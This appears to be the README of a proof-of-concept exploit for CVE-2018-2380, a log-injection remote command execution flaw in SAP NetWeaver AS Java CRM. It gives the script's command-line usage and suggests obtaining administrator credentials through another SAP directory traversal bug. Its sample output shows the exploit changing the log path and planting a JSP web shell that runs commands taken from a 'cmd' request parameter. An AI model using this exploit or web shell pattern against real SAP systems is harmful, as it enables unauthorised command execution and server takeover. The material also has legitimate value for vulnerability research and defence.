# CVE-2018-2380 (CVSS v3 Base Score: 6.6/10)
PoC of Remote Command Execution via Log injection on SAP NetWeaver AS JAVA CRM
Script usage example 
```
python crm_rce-CVE-2018-2380.py --host 127.0.0.1 --port 50001 --username administrator --password 123QWEasd --SID DM0 --ssl true
```

Where
--host is a SAP server IP
--port SAP NetWeaver AS Java port
username and password of SAP administrator you can get using SAP Redwood directory traversal vulnerability. 


example script usage output
```
C:\exploits\SAP>crm_rce-CVE-2018-2380.py --host 127.0.0.1 --port 50001 --username administrator --password 123QWEasd --SID DM0 --ssl true

 _______  _______  _______  _______  _______  _______  _
(  ____ \(  ____ )(  ____ )(  ____ \(  ____ \(  ___  )( (    /|
| (    \/| (    )|| (    )|| (    \/| (    \/| (   ) ||  \  ( |
| (__    | (____)|| (____)|| (_____ | |      | (___) ||   \ | |
|  __)   |     __)|  _____)(_____  )| |      |  ___  || (\ \) |
| (      | (\ (   | (            ) || |      | (   ) || | \   |
| (____/\| ) \ \__| )      /\____) || (____/\| )   ( || )  \  |
(_______/|/   \__/|/       \_______)(_______/|/     \||/    )_)
Vahagn @vah_13 Vardanian
Bob @NewFranny
Mathieu @gelim
CVE-2018-2380


[!] Try to get RCE using log injection
[!] Get j_salt token for requests
[!] Login to the SAP portal
[!] Change log path
[!] Upload "Runtime.getRuntime().exec(request.getParameter("cmd")) " shell to https://127.0.0.1:50001/ERPScan_shell_31275.0.jsp?cmd=ipconfig
[!] Restore logs path to ./default_log_name.log
[!] Enjoy!

C:\exploits\SAP>
```
